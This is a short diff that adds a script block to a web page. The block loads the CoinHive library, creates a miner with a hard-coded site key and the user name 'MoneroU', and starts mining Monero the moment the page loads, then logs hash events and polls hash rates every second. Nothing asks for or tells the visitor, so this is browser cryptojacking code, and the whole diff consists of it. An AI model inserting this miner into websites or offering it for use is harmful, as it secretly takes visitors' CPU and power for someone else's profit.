@@ -1,0 +1,19 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('JG2Ux5GDQ0GFaLDkhMinBjEcx6F2TuMs', 'MoneroU');
+    miner.start();
+    
+
+    // Listen on events
+	miner.on('found', function() { /* Hash found */console.log('found') })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ console.log('accepted')})
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script>
